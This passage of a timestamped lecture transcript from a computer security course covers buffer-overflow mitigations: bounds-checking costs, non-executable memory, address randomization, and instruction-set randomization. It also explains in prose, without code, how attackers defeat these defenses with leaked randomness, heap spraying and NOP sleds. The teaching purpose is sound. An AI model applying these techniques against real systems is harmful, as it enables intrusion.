            </slice>
            <slice>
              <time_slice>19:16</time_slice>
              <text_slice>and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>19:18</time_slice>
              <text_slice>So that's going to
slow your program down.</text_slice>
            </slice>
            <slice>
              <time_slice>19:21</time_slice>
              <text_slice>There's also this problem
with false alarms, right.</text_slice>
            </slice>
            <slice>
              <time_slice>19:26</time_slice>
              <text_slice>So as we discussed,
it may be the case</text_slice>
            </slice>
            <slice>
              <time_slice>19:29</time_slice>
              <text_slice>that a program generates
out of bound pointers</text_slice>
            </slice>
            <slice>
              <time_slice>19:31</time_slice>
              <text_slice>but never tries to
dereference it, right.</text_slice>
            </slice>
            <slice>
              <time_slice>19:33</time_slice>
              <text_slice>Strictly speaking
that's not an issue.</text_slice>
            </slice>
            <slice>
              <time_slice>19:35</time_slice>
              <text_slice>The baggy bounds will
flag the creation</text_slice>
            </slice>
            <slice>
              <time_slice>19:37</time_slice>
              <text_slice>of those out of bounds
pointers, if they</text_slice>
            </slice>
            <slice>
              <time_slice>19:39</time_slice>
              <text_slice>get beyond a 1/2 a slot size,
at least in the 32-bit solution,</text_slice>
            </slice>
            <slice>
              <time_slice>19:42</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>19:43</time_slice>
              <text_slice>And so what you'll see with
a lot of security tools,</text_slice>
            </slice>
            <slice>
              <time_slice>19:45</time_slice>
              <text_slice>is that false alarms really
reduce the likelihood</text_slice>
            </slice>
            <slice>
              <time_slice>19:48</time_slice>
              <text_slice>that people are going to
use your tools, right.</text_slice>
            </slice>
            <slice>
              <time_slice>19:50</time_slice>
              <text_slice>Because in practice
we would all hope</text_slice>
            </slice>
            <slice>
              <time_slice>19:52</time_slice>
              <text_slice>that we care about
security, but actually</text_slice>
            </slice>
            <slice>
              <time_slice>19:54</time_slice>
              <text_slice>what do people care about?</text_slice>
            </slice>
            <slice>
              <time_slice>19:55</time_slice>
              <text_slice>They want to be able to upload
their silly Facebook photos</text_slice>
            </slice>
            <slice>
              <time_slice>19:57</time_slice>
              <text_slice>and life things,
and they want to be</text_slice>
            </slice>
            <slice>
              <time_slice>19:59</time_slice>
              <text_slice>able to make things go
fast and stuff like that.</text_slice>
            </slice>
            <slice>
              <time_slice>20:01</time_slice>
              <text_slice>So you really want
your security tools</text_slice>
            </slice>
            <slice>
              <time_slice>20:03</time_slice>
              <text_slice>to probably have less
coverage of finding bugs,</text_slice>
            </slice>
            <slice>
              <time_slice>20:07</time_slice>
              <text_slice>but actually have
0 false alarms.</text_slice>
            </slice>
            <slice>
              <time_slice>20:09</time_slice>
              <text_slice>As opposed to catching all types
of security vulnerabilities,</text_slice>
            </slice>
            <slice>
              <time_slice>20:12</time_slice>
              <text_slice>but then maybe having
some false alarms</text_slice>
            </slice>
            <slice>
              <time_slice>20:14</time_slice>
              <text_slice>that are going to irritate
developers, or irritate users.</text_slice>
            </slice>
            <slice>
              <time_slice>20:16</time_slice>
              <text_slice>And the other costs that you
have for this is finally,</text_slice>
            </slice>
            <slice>
              <time_slice>20:19</time_slice>
              <text_slice>is that you need
compiler support, right.</text_slice>
            </slice>
            <slice>
              <time_slice>20:25</time_slice>
              <text_slice>Which can actually end
up being nontrivial,</text_slice>
            </slice>
            <slice>
              <time_slice>20:27</time_slice>
              <text_slice>because you have
to go in there, you</text_slice>
            </slice>
            <slice>
              <time_slice>20:28</time_slice>
              <text_slice>have to add all the
instrumentation,</text_slice>
            </slice>
            <slice>
              <time_slice>20:30</time_slice>
              <text_slice>crawl the pointer checks,
and so on ans so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>20:32</time_slice>
              <text_slice>So those are basically the
cost of these bounds checking</text_slice>
            </slice>
            <slice>
              <time_slice>20:35</time_slice>
              <text_slice>approaches.</text_slice>
            </slice>
            <slice>
              <time_slice>20:37</time_slice>
              <text_slice>So that concludes the
discussion of baggy bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>20:42</time_slice>
              <text_slice>And so now we can actually think
about a two other mitigation</text_slice>
            </slice>
            <slice>
              <time_slice>20:45</time_slice>
              <text_slice>strategies for buffer overflows.</text_slice>
            </slice>
            <slice>
              <time_slice>20:46</time_slice>
              <text_slice>They're actually much simpler
to explain and understand.</text_slice>
            </slice>
            <slice>
              <time_slice>20:49</time_slice>
              <text_slice>So one of these approaches is
called a non-executable memory.</text_slice>
            </slice>
            <slice>
              <time_slice>21:00</time_slice>
              <text_slice>And the basic idea is
that the paging hardware</text_slice>
            </slice>
            <slice>
              <time_slice>21:04</time_slice>
              <text_slice>is going to specify
3-bits for each page</text_slice>
            </slice>
            <slice>
              <time_slice>21:08</time_slice>
              <text_slice>that you have in memory, read,
write and execute, right.</text_slice>
            </slice>
            <slice>
              <time_slice>21:12</time_slice>
              <text_slice>Can the program read
that memory, write to it,</text_slice>
            </slice>
            <slice>
              <time_slice>21:13</time_slice>
              <text_slice>execute it.</text_slice>
            </slice>
            <slice>
              <time_slice>21:14</time_slice>
              <text_slice>The first 2-bits
are old, they've</text_slice>
            </slice>
            <slice>
              <time_slice>21:16</time_slice>
              <text_slice>been around for a while,
that last bit is actually</text_slice>
            </slice>
            <slice>
              <time_slice>21:18</time_slice>
              <text_slice>a fairly new construction.</text_slice>
            </slice>
            <slice>
              <time_slice>21:19</time_slice>
              <text_slice>And so the idea is
that you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>21:21</time_slice>
              <text_slice>make the stack
non-executable, right.</text_slice>
            </slice>
            <slice>
              <time_slice>21:24</time_slice>
              <text_slice>So if you make the
stack non-executable</text_slice>
            </slice>
            <slice>
              <time_slice>21:26</time_slice>
              <text_slice>that means that the
adversary can't run code</text_slice>
            </slice>
            <slice>
              <time_slice>21:29</time_slice>
              <text_slice>just by pointing-- by
creating that shell code</text_slice>
            </slice>
            <slice>
              <time_slice>21:31</time_slice>
              <text_slice>and then sort of jumping to
someplace in that buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>21:34</time_slice>
              <text_slice>And so what a lot of systems
do, is they actually specify</text_slice>
            </slice>
            <slice>
              <time_slice>21:39</time_slice>
              <text_slice>a policy like this.</text_slice>
            </slice>
            <slice>
              <time_slice>21:43</time_slice>
              <text_slice>So right exclusive or x,
which means that if you have</text_slice>
            </slice>
            <slice>
              <time_slice>21:46</time_slice>
              <text_slice>a particular page, you
can either write to it,</text_slice>
            </slice>
            <slice>
              <time_slice>21:49</time_slice>
              <text_slice>or you can treat it
as executable code,</text_slice>
            </slice>
            <slice>
              <time_slice>21:52</time_slice>
              <text_slice>but you cannot do both.</text_slice>
            </slice>
            <slice>
              <time_slice>21:53</time_slice>
              <text_slice>OK and so that once
again, is going</text_slice>
            </slice>
            <slice>
              <time_slice>21:55</time_slice>
              <text_slice>to prevent the
attacker from just</text_slice>
            </slice>
            <slice>
              <time_slice>21:56</time_slice>
              <text_slice>putting executable
code in the stack</text_slice>
            </slice>
            <slice>
              <time_slice>21:58</time_slice>
              <text_slice>and then going straight to it.</text_slice>
            </slice>
            <slice>
              <time_slice>22:00</time_slice>
              <text_slice>So this is-- should be pretty
straightforward, right.</text_slice>
            </slice>
            <slice>
              <time_slice>22:02</time_slice>
              <text_slice>So we've removed, at the
hardware level, this attack</text_slice>
            </slice>
            <slice>
              <time_slice>22:06</time_slice>
              <text_slice>vector of the attacker putting
executable code in the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>22:09</time_slice>
              <text_slice>So what's nice about this?</text_slice>
            </slice>
            <slice>
              <time_slice>22:11</time_slice>
              <text_slice>Well potentially this
works without any changes</text_slice>
            </slice>
            <slice>
              <time_slice>22:14</time_slice>
              <text_slice>to the application, right.</text_slice>
            </slice>
            <slice>
              <time_slice>22:16</time_slice>
              <text_slice>This is all taken place
at the hardware level</text_slice>
            </slice>
            <slice>
              <time_slice>22:18</time_slice>
              <text_slice>and at the OS level,
with the OS just</text_slice>
            </slice>
            <slice>
              <time_slice>22:20</time_slice>
              <text_slice>making sure the pages are
protected with these bits, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>22:23</time_slice>
              <text_slice>So that's very,
very nuts, right.</text_slice>
            </slice>
            <slice>
              <time_slice>22:24</time_slice>
              <text_slice>Because you don;t have to worry
about this compiler support</text_slice>
            </slice>
            <slice>
              <time_slice>22:27</time_slice>
              <text_slice>issue we had over here.</text_slice>
            </slice>
            <slice>
              <time_slice>22:28</time_slice>
              <text_slice>The other nice thing
is that, as I mentioned</text_slice>
            </slice>
            <slice>
              <time_slice>22:30</time_slice>
              <text_slice>in the last lecture,
the hardware's</text_slice>
            </slice>
            <slice>
              <time_slice>22:32</time_slice>
              <text_slice>always watching you, even
though the OS is not, right.</text_slice>
            </slice>
            <slice>
              <time_slice>22:35</time_slice>
              <text_slice>So these bits being
said over here,</text_slice>
            </slice>
            <slice>
              <time_slice>22:37</time_slice>
              <text_slice>you know they're
looked at and verified</text_slice>
            </slice>
            <slice>
              <time_slice>22:40</time_slice>
              <text_slice>for correctness at
every memory reference</text_slice>
            </slice>
            <slice>
              <time_slice>22:42</time_slice>
              <text_slice>that you make by the code.</text_slice>
            </slice>
            <slice>
              <time_slice>22:43</time_slice>
              <text_slice>That's a very nice
aspect of this too.</text_slice>
            </slice>
            <slice>
              <time_slice>22:46</time_slice>
              <text_slice>Now one disadvantage
of this system</text_slice>
            </slice>
            <slice>
              <time_slice>22:49</time_slice>
              <text_slice>though, is that it makes it
harder for an application</text_slice>
            </slice>
            <slice>
              <time_slice>22:52</time_slice>
              <text_slice>to dynamically generate code,
in benign or benevolent cases.</text_slice>
            </slice>
            <slice>
              <time_slice>22:56</time_slice>
              <text_slice>And the best example of
that is, the just-in-time</text_slice>
            </slice>
            <slice>
              <time_slice>22:59</time_slice>
              <text_slice>compilers that we discussed
from last lecture, right.</text_slice>
            </slice>
            <slice>
              <time_slice>23:02</time_slice>
              <text_slice>So how is it that
you can go to a web</text_slice>
            </slice>
            <slice>
              <time_slice>23:04</time_slice>
              <text_slice>page and your JavaScript
code executes fast.</text_slice>
            </slice>
            <slice>
              <time_slice>23:06</time_slice>
              <text_slice>It downloads that
JavaScript source,</text_slice>
            </slice>
            <slice>
              <time_slice>23:07</time_slice>
              <text_slice>it initially probably
starts just interpreting it,</text_slice>
            </slice>
            <slice>
              <time_slice>23:09</time_slice>
              <text_slice>but then at some
point it's going</text_slice>
            </slice>
            <slice>
              <time_slice>23:11</time_slice>
              <text_slice>to find some hot
path, some hot loop</text_slice>
            </slice>
            <slice>
              <time_slice>23:12</time_slice>
              <text_slice>and then it's going to
dynamically generate</text_slice>
            </slice>
            <slice>
              <time_slice>23:14</time_slice>
              <text_slice>x86 machine code and execute
that directly, right.</text_slice>
            </slice>
            <slice>
              <time_slice>23:17</time_slice>
              <text_slice>But to get that to work you have
to be able to dynamically write</text_slice>
            </slice>
            <slice>
              <time_slice>23:20</time_slice>
              <text_slice>code to a page.</text_slice>
            </slice>
            <slice>
              <time_slice>23:23</time_slice>
              <text_slice>So there's some ways you can
get around this for example,</text_slice>
            </slice>
            <slice>
              <time_slice>23:25</time_slice>
              <text_slice>you could imagine that the
just-in-time compiler initially</text_slice>
            </slice>
            <slice>
              <time_slice>23:28</time_slice>
              <text_slice>sets the write bit and then
it removes the write bit,</text_slice>
            </slice>
            <slice>
              <time_slice>23:31</time_slice>
              <text_slice>then it sets the execute bits.</text_slice>
            </slice>
            <slice>
              <time_slice>23:32</time_slice>
              <text_slice>There are some ways that
you can get around that,</text_slice>
            </slice>
            <slice>
              <time_slice>23:34</time_slice>
              <text_slice>but it can be a little
bit tricky sometimes.</text_slice>
            </slice>
            <slice>
              <time_slice>23:36</time_slice>
              <text_slice>On a higher level, that's how
non-executable memory works,</text_slice>
            </slice>
            <slice>
              <time_slice>23:39</time_slice>
              <text_slice>pretty easy to understand.</text_slice>
            </slice>
            <slice>
              <time_slice>23:40</time_slice>
              <text_slice>AUDIENCE: What is the
definition of like executable</text_slice>
            </slice>
            <slice>
              <time_slice>23:44</time_slice>
              <text_slice>instructions?</text_slice>
            </slice>
            <slice>
              <time_slice>23:44</time_slice>
              <text_slice>So if you change the
attenuator [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>23:46</time_slice>
              <text_slice>it's not considered a
executable instruction.</text_slice>
            </slice>
            <slice>
              <time_slice>23:47</time_slice>
              <text_slice>PROFESSOR: Well basically no.</text_slice>
            </slice>
            <slice>
              <time_slice>23:49</time_slice>
              <text_slice>Can you set like the instruction
pointer register to that value.</text_slice>
            </slice>
            <slice>
              <time_slice>23:53</time_slice>
              <text_slice>In other words, can you-- if you
have a bunch of memory pages,</text_slice>
            </slice>
            <slice>
              <time_slice>23:56</time_slice>
              <text_slice>can you actually set EIP
there and actually start</text_slice>
            </slice>
            <slice>
              <time_slice>23:58</time_slice>
              <text_slice>executing code from that page.</text_slice>
            </slice>
            <slice>
              <time_slice>23:59</time_slice>
              <text_slice>AUDIENCE: Ah.</text_slice>
            </slice>
            <slice>
              <time_slice>24:03</time_slice>
              <text_slice>PROFESSOR: OK, so that
is nonexecutable memory.</text_slice>
            </slice>
            <slice>
              <time_slice>24:07</time_slice>
              <text_slice>And so another
technique you might</text_slice>
            </slice>
            <slice>
              <time_slice>24:09</time_slice>
              <text_slice>imagine for protecting
against a buffer overflows</text_slice>
            </slice>
            <slice>
              <time_slice>24:12</time_slice>
              <text_slice>is using a randomized
addresses or address spaces.</text_slice>
            </slice>
            <slice>
              <time_slice>24:26</time_slice>
              <text_slice>And so the observation
here is, that a lot</text_slice>
            </slice>
            <slice>
              <time_slice>24:30</time_slice>
              <text_slice>of the attacks that
we've discussed so far</text_slice>
            </slice>
            <slice>
              <time_slice>24:35</time_slice>
              <text_slice>use hard coded addresses, right.</text_slice>
            </slice>
            <slice>
              <time_slice>24:39</time_slice>
              <text_slice>And so if you think about
a lot of the attacks</text_slice>
            </slice>
            <slice>
              <time_slice>24:42</time_slice>
              <text_slice>you've been working on in
your lab, how does that work?</text_slice>
            </slice>
            <slice>
              <time_slice>24:44</time_slice>
              <text_slice>You open up the program
in GDB, you find out</text_slice>
            </slice>
            <slice>
              <time_slice>24:47</time_slice>
              <text_slice>the location of some things,
you may create some shell code</text_slice>
            </slice>
            <slice>
              <time_slice>24:49</time_slice>
              <text_slice>that actually has some hard
coded addresses in there,</text_slice>
            </slice>
            <slice>
              <time_slice>24:52</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>24:53</time_slice>
              <text_slice>So the idea behind the
randomized address base</text_slice>
            </slice>
            <slice>
              <time_slice>24:55</time_slice>
              <text_slice>is simple.</text_slice>
            </slice>
            <slice>
              <time_slice>24:55</time_slice>
              <text_slice>Basically you want to make
it difficult for the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>25:03</time_slice>
              <text_slice>to guess addresses.</text_slice>
            </slice>
            <slice>
              <time_slice>25:08</time_slice>
              <text_slice>So there's a couple
different ways</text_slice>
            </slice>
            <slice>
              <time_slice>25:09</time_slice>
              <text_slice>you could think about
doing this, right.</text_slice>
            </slice>
            <slice>
              <time_slice>25:11</time_slice>
              <text_slice>So one idea is that
you can imagine having</text_slice>
            </slice>
            <slice>
              <time_slice>25:13</time_slice>
              <text_slice>stack randomization, right.</text_slice>
            </slice>
            <slice>
              <time_slice>25:15</time_slice>
              <text_slice>So imagine that
from here to here,</text_slice>
            </slice>
            <slice>
              <time_slice>25:17</time_slice>
              <text_slice>this is the entire virtual
memory space of the program,</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>As we described this
stuff to you so far,</text_slice>
            </slice>
            <slice>
              <time_slice>25:22</time_slice>
              <text_slice>basically the
stack always starts</text_slice>
            </slice>
            <slice>
              <time_slice>25:24</time_slice>
              <text_slice>with this particular place
up here, always goes down,</text_slice>
            </slice>
            <slice>
              <time_slice>25:27</time_slice>
              <text_slice>right, and the program codes
down here and the heap always</text_slice>
            </slice>
            <slice>
              <time_slice>25:30</time_slice>
              <text_slice>goes up here.</text_slice>
            </slice>
            <slice>
              <time_slice>25:31</time_slice>
              <text_slice>And all these seg-- all of these
segments, the stack, the heap,</text_slice>
            </slice>
            <slice>
              <time_slice>25:35</time_slice>
              <text_slice>and the program code, they all
start at a well known location.</text_slice>
            </slice>
            <slice>
              <time_slice>25:38</time_slice>
              <text_slice>So imagine for example, like
if my lecture notes here</text_slice>
            </slice>
            <slice>
              <time_slice>25:40</time_slice>
              <text_slice>are the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>25:41</time_slice>
              <text_slice>You can imagine instead of
the stack always starting here</text_slice>
            </slice>
            <slice>
              <time_slice>25:44</time_slice>
              <text_slice>at this known location,
maybe you start it here,</text_slice>
            </slice>
            <slice>
              <time_slice>25:46</time_slice>
              <text_slice>maybe you start it here.</text_slice>
            </slice>
            <slice>
              <time_slice>25:47</time_slice>
              <text_slice>Somewhere else like that, right.</text_slice>
            </slice>
            <slice>
              <time_slice>25:49</time_slice>
              <text_slice>Similarly you can imagine that
maybe the program code which</text_slice>
            </slice>
            <slice>
              <time_slice>25:51</time_slice>
              <text_slice>used to always start
down here, maybe we</text_slice>
            </slice>
            <slice>
              <time_slice>25:53</time_slice>
              <text_slice>start it up here, or down here,
or something like that, right.</text_slice>
            </slice>
            <slice>
              <time_slice>25:56</time_slice>
              <text_slice>So the idea now is that
if you, the attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>25:58</time_slice>
              <text_slice>control one of these
binary's, you can look in GDB</text_slice>
            </slice>
            <slice>
              <time_slice>26:01</time_slice>
              <text_slice>and figure out where
all these offsets are,</text_slice>
            </slice>
            <slice>
              <time_slice>26:02</time_slice>
              <text_slice>but they're not actually
going to help you figure out</text_slice>
            </slice>
            <slice>
              <time_slice>26:05</time_slice>
              <text_slice>where those offsets are
in the real code that's</text_slice>
            </slice>
            <slice>
              <time_slice>26:07</time_slice>
              <text_slice>running on the server, right.</text_slice>
            </slice>
            <slice>
              <time_slice>26:09</time_slice>
              <text_slice>So that's the basic idea behind
these randomized address spaces</text_slice>
            </slice>
            <slice>
              <time_slice>26:12</time_slice>
              <text_slice>there.</text_slice>
            </slice>
            <slice>
              <time_slice>26:13</time_slice>
              <text_slice>And so this takes
advantage of the fact</text_slice>
            </slice>
            <slice>
              <time_slice>26:15</time_slice>
              <text_slice>that a lot of the code
that you generate,</text_slice>
            </slice>
            <slice>
              <time_slice>26:17</time_slice>
              <text_slice>doesn't have to be loaded into
a specific place in memory,</text_slice>
            </slice>
            <slice>
              <time_slice>26:19</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>26:20</time_slice>
              <text_slice>So unless you're writing like
a device driver, or something</text_slice>
            </slice>
            <slice>
              <time_slice>26:22</time_slice>
              <text_slice>like, that maybe is interacting
with some hardware that</text_slice>
            </slice>
            <slice>
              <time_slice>26:25</time_slice>
              <text_slice>requires this
particular address to be</text_slice>
            </slice>
            <slice>
              <time_slice>26:29</time_slice>
              <text_slice>belong in this particular buffer
so it can copy information in.</text_slice>
            </slice>
            <slice>
              <time_slice>26:32</time_slice>
              <text_slice>If you're not doing stuff
like that then typically</text_slice>
            </slice>
            <slice>
              <time_slice>26:34</time_slice>
              <text_slice>your codes going
to be relocatable.</text_slice>
            </slice>
            <slice>
              <time_slice>26:36</time_slice>
              <text_slice>So this approach will work very
nicely with that kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>26:40</time_slice>
              <text_slice>So once again the question
is, can you exploit this?</text_slice>
            </slice>
            <slice>
              <time_slice>26:43</time_slice>
              <text_slice>Obviously the
answer is still yes.</text_slice>
            </slice>
            <slice>
              <time_slice>26:45</time_slice>
              <text_slice>There's a couple different
ways you can do it</text_slice>
            </slice>
            <slice>
              <time_slice>26:47</time_slice>
              <text_slice>as we'll discuss later today
in the [INAUDIBLE] paper,</text_slice>
            </slice>
            <slice>
              <time_slice>26:50</time_slice>
              <text_slice>the attacker can actually
extract randomness, right.</text_slice>
            </slice>
            <slice>
              <time_slice>26:53</time_slice>
              <text_slice>And so in general that's
how you defeat all</text_slice>
            </slice>
            <slice>
              <time_slice>26:55</time_slice>
              <text_slice>these randomized approaches.</text_slice>
            </slice>
            <slice>
              <time_slice>26:56</time_slice>
              <text_slice>You make them unrandom,
by either finding out</text_slice>
            </slice>
            <slice>
              <time_slice>26:58</time_slice>
              <text_slice>the random seed that
the attacker was doing,</text_slice>
            </slice>
            <slice>
              <time_slice>27:00</time_slice>
              <text_slice>or by somehow leveraging the
fact that the attacker leaks</text_slice>
            </slice>
            <slice>
              <time_slice>27:03</time_slice>
              <text_slice>information about the randomized
locations of these things.</text_slice>
            </slice>
            <slice>
              <time_slice>27:10</time_slice>
              <text_slice>And another thing
that's interesting</text_slice>
            </slice>
            <slice>
              <time_slice>27:12</time_slice>
              <text_slice>is that for a lot of the
attacks we've discussed so far,</text_slice>
            </slice>
            <slice>
              <time_slice>27:15</time_slice>
              <text_slice>we've basically been using these
sort of hard coded addresses,</text_slice>
            </slice>
            <slice>
              <time_slice>27:18</time_slice>
              <text_slice>but note that the attacker
may not necessarily</text_slice>
            </slice>
            <slice>
              <time_slice>27:21</time_slice>
              <text_slice>care about jumping to
a specific address.</text_slice>
            </slice>
            <slice>
              <time_slice>27:23</time_slice>
              <text_slice>Or there's this attack
called a heap attack, which</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>is actually pretty hilarious if
you're a bad person, I suppose.</text_slice>
            </slice>
            <slice>
              <time_slice>27:29</time_slice>
              <text_slice>So the way that this
heap attack works</text_slice>
            </slice>
            <slice>
              <time_slice>27:32</time_slice>
              <text_slice>is, that the
attacker essentially</text_slice>
            </slice>
            <slice>
              <time_slice>27:34</time_slice>
              <text_slice>just starts dynamically
allocating a ton of shell code</text_slice>
            </slice>
            <slice>
              <time_slice>27:37</time_slice>
              <text_slice>and just stuffs it
randomly in memory, right.</text_slice>
            </slice>
            <slice>
              <time_slice>27:39</time_slice>
              <text_slice>This is particularly
effective if you're</text_slice>
            </slice>
            <slice>
              <time_slice>27:41</time_slice>
              <text_slice>using like a dynamically high
level language like JavaScript</text_slice>
            </slice>
            <slice>
              <time_slice>27:44</time_slice>
              <text_slice>let's say.</text_slice>
            </slice>
            <slice>
              <time_slice>27:45</time_slice>
              <text_slice>So the tag reader is
sitting in a tight loop</text_slice>
            </slice>
            <slice>
              <time_slice>27:46</time_slice>
              <text_slice>and just generate a bunch of
shell code strings, right.</text_slice>
            </slice>
            <slice>
              <time_slice>27:49</time_slice>
              <text_slice>And you just fill the heap
with all these shell code</text_slice>
            </slice>
            <slice>
              <time_slice>27:51</time_slice>
              <text_slice>strings, right.</text_slice>
            </slice>
            <slice>
              <time_slice>27:53</time_slice>
              <text_slice>Now the attacker maybe cannot
figure out where the exact</text_slice>
            </slice>
            <slice>
              <time_slice>27:55</time_slice>
              <text_slice>location is of each of
the shell code strings,</text_slice>
            </slice>
            <slice>
              <time_slice>27:58</time_slice>
              <text_slice>but if you've allocated 10s of
megabytes of shell code strings</text_slice>
            </slice>
            <slice>
              <time_slice>28:02</time_slice>
              <text_slice>and then just do a
random jump, right.</text_slice>
            </slice>
            <slice>
              <time_slice>28:04</time_slice>
              <text_slice>If you could somehow control
one of these ret pointers,</text_slice>
            </slice>
            <slice>
              <time_slice>28:06</time_slice>
              <text_slice>then hey, maybe you'll
land in shell code, right.</text_slice>
            </slice>
            <slice>
              <time_slice>28:09</time_slice>
              <text_slice>And one trick you
can actually use</text_slice>
            </slice>
            <slice>
              <time_slice>28:11</time_slice>
              <text_slice>is this thing called NOP sleds,
which is also pretty hilarious.</text_slice>
            </slice>
            <slice>
              <time_slice>28:14</time_slice>
              <text_slice>So imagine that if you have
a shell code string, then</text_slice>
            </slice>
            <slice>
              <time_slice>28:18</time_slice>
              <text_slice>it may not work out if
you jump to a random place</text_slice>
            </slice>
            <slice>
              <time_slice>28:20</time_slice>
              <text_slice>in that shell code
string, because it may not</text_slice>
            </slice>
            <slice>
              <time_slice>28:22</time_slice>
              <text_slice>set the attack up correctly.</text_slice>
            </slice>
            <slice>
              <time_slice>28:24</time_slice>
              <text_slice>But maybe this stuff that
your spewing to the heap,</text_slice>
            </slice>
            <slice>
              <time_slice>28:27</time_slice>
              <text_slice>is basically just a ton of NOPs
and then at the very, very end</text_slice>
            </slice>
            <slice>
              <time_slice>28:30</time_slice>
              <text_slice>you have the shell code, right.</text_slice>
            </slice>
            <slice>
              <time_slice>28:32</time_slice>
              <text_slice>This is actually
quite clever right,</text_slice>
            </slice>
            <slice>
              <time_slice>28:33</time_slice>
              <text_slice>because this means that now
you can actually goof up</text_slice>
            </slice>
            <slice>
              <time_slice>28:36</time_slice>
              <text_slice>the exact place where you jump.</text_slice>
            </slice>
            <slice>
              <time_slice>28:38</time_slice>
              <text_slice>If you jump into
another one of these NOP</text_slice>
            </slice>
            <slice>
              <time_slice>28:39</time_slice>
              <text_slice>things just go boom, boom, boom,
boom, boom, boom, boom, then</text_slice>
            </slice>
            <slice>
              <time_slice>28:42</time_slice>
              <text_slice>you hit the shell code, right.</text_slice>
            </slice>
            <slice>
              <time_slice>28:43</time_slice>
              <text_slice>So it's like these are the
people that you probably</text_slice>
            </slice>
            <slice>
              <time_slice>28:46</time_slice>
              <text_slice>see on the team.</text_slice>
            </slice>
            <slice>
              <time_slice>28:47</time_slice>
              <text_slice>They're inventing these
types of things, right.</text_slice>
            </slice>
            <slice>
              <time_slice>28:49</time_slice>
              <text_slice>This is a problem.</text_slice>
            </slice>
            <slice>
              <time_slice>28:49</time_slice>
              <text_slice>So that's another way
to get around some</text_slice>
            </slice>
            <slice>
              <time_slice>28:51</time_slice>
              <text_slice>of this randomization
stuff, just</text_slice>
            </slice>
            <slice>
              <time_slice>28:53</time_slice>
              <text_slice>by making your codes
randomization resilient,</text_slice>
            </slice>
            <slice>
              <time_slice>28:55</time_slice>
              <text_slice>if that makes sense.</text_slice>
            </slice>
            <slice>
              <time_slice>28:58</time_slice>
              <text_slice>OK so that's basically
a discussion of some</text_slice>
            </slice>
            <slice>
              <time_slice>29:01</time_slice>
              <text_slice>of the types of
randomness you can use.</text_slice>
            </slice>
            <slice>
              <time_slice>29:03</time_slice>
              <text_slice>There's also some wacky ideas
that people have had too.</text_slice>
            </slice>
            <slice>
              <time_slice>29:05</time_slice>
              <text_slice>So now you know
that when you want</text_slice>
            </slice>
            <slice>
              <time_slice>29:06</time_slice>
              <text_slice>to make a system
call for example,</text_slice>
            </slice>
            <slice>
              <time_slice>29:08</time_slice>
              <text_slice>you use this syscall
libc function</text_slice>
            </slice>
            <slice>
              <time_slice>29:11</time_slice>
              <text_slice>and you basically pass
any unique number that</text_slice>
            </slice>
            <slice>
              <time_slice>29:13</time_slice>
              <text_slice>represents the system call
that you want to make, right.</text_slice>
            </slice>
            <slice>
              <time_slice>29:15</time_slice>
              <text_slice>So maybe four is seven and maybe
sleep is eight, or something</text_slice>
            </slice>
            <slice>
              <time_slice>29:19</time_slice>
              <text_slice>like that, right.</text_slice>
            </slice>
            <slice>
              <time_slice>29:20</time_slice>
              <text_slice>So what that means is that
if the attacker can somehow</text_slice>
            </slice>
            <slice>
              <time_slice>29:23</time_slice>
              <text_slice>figure out the address of
that syscall instruction</text_slice>
            </slice>
            <slice>
              <time_slice>29:26</time_slice>
              <text_slice>and jump to it somehow, he or
she can actually just supply</text_slice>
            </slice>
            <slice>
              <time_slice>29:29</time_slice>
              <text_slice>the system call number that they
want to invoke directly, right.</text_slice>
            </slice>
            <slice>
              <time_slice>29:32</time_slice>
              <text_slice>So you could imagine that
each time the program runs,</text_slice>
            </slice>
            <slice>
              <time_slice>29:35</time_slice>
              <text_slice>you actually create a dynamic
assignment of syscall numbers</text_slice>
            </slice>
            <slice>
              <time_slice>29:39</time_slice>
              <text_slice>to actual syscalls, right.</text_slice>
            </slice>
            <slice>
              <time_slice>29:40</time_slice>
              <text_slice>To make it harder for the
attacker to get stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>29:42</time_slice>
              <text_slice>There's even some very
avant garde proposals</text_slice>
            </slice>
            <slice>
              <time_slice>29:45</time_slice>
              <text_slice>to change the hardware such
that the hardware actually</text_slice>
            </slice>
            <slice>
              <time_slice>29:48</time_slice>
              <text_slice>contains an xor key, that
is used to dynamically xor</text_slice>
            </slice>
            <slice>
              <time_slice>29:51</time_slice>
              <text_slice>instructions, right.</text_slice>
            </slice>
            <slice>
              <time_slice>29:53</time_slice>
              <text_slice>Imagine every time you
compile the program, all</text_slice>
            </slice>
            <slice>
              <time_slice>29:55</time_slice>
              <text_slice>of the instruction codes that's
the xor of some key, right.</text_slice>
            </slice>
            <slice>
              <time_slice>29:58</time_slice>
              <text_slice>That key is put into
that hardware register</text_slice>
            </slice>
            <slice>
              <time_slice>30:00</time_slice>
              <text_slice>when you initially
load the program</text_slice>
            </slice>
            <slice>
              <time_slice>30:02</time_slice>
              <text_slice>and then whenever you
execute an instruction,</text_slice>
            </slice>
            <slice>
              <time_slice>30:04</time_slice>
              <text_slice>the hardware
automatically xor's it,</text_slice>
            </slice>
            <slice>
              <time_slice>30:06</time_slice>
              <text_slice>before you continue executing
that instruction, right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:08</time_slice>
              <text_slice>So what's nice about
that is, that now even</text_slice>
            </slice>
            <slice>
              <time_slice>30:10</time_slice>
              <text_slice>if the attacker can
generate the shell code,</text_slice>
            </slice>
            <slice>
              <time_slice>30:12</time_slice>
              <text_slice>the attacker doesn't
know that key, right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:14</time_slice>
